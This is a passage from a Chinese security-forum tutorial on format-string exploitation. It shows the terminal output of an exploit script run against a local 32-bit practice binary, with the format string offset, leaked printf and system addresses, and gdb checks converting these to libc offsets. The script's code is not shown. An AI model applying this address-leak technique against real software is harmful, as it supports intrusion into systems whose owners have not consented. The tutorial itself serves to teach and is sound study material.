
```
bigeast@ubuntu:~/Desktop/attach$ python got.py
[*] '/home/bigeast/Desktop/attach/fmtgot'
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
[+] Starting local process './fmtgot': pid 3106
[*] '/lib/i386-linux-gnu/libc.so.6'
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
[*] Found format string offset: 4
4158829616
('printf', 332848)
('system', 250592)
('---', 82256)
[*] system_addr => 0xf7e172e0
[*] Switching to interactive mode
```

可以看到输出的`system`函数地址`0xf7e172e0`与`gdb`打印的内容一致。

我们打印一下`gdb`里面`printf`实际运行地址的十进制表示：

```
gef➤  p/d 0xf7e2b430
$1 = 4158829616
```

可以看到`4158829616`就是`printf`地址的十进制表示。

```
gef➤  p/x 332848
$1 = 0x51430
gef➤  p/x 250592
$2 = 0x3d2e0
```

这是在`libc`中的地址。

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2022-1-4 15:50 被 kanxue 编辑，原因：

[#基础知识](https://bbs.kanxue.com/forum-171-1-180.htm)

[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)

[#格式化](https://bbs.kanxue.com/forum-171-1-183.htm)
